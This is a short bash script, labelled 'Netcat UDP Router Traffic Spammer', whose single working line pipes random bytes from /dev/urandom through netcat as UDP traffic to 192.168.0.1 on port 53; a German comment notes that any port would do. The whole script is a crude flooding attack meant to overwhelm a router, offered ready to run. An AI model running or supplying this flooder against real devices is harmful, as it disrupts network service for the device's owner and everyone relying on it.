#!/bin/bash


echo "Netcat UDP Router Traffic Spammer"
echo ""
echo "in Progress..."

cat /dev/urandom | nc -u 192.168.0.1 53		#Egal welcher Port, hier 53 (DNS Server Port)

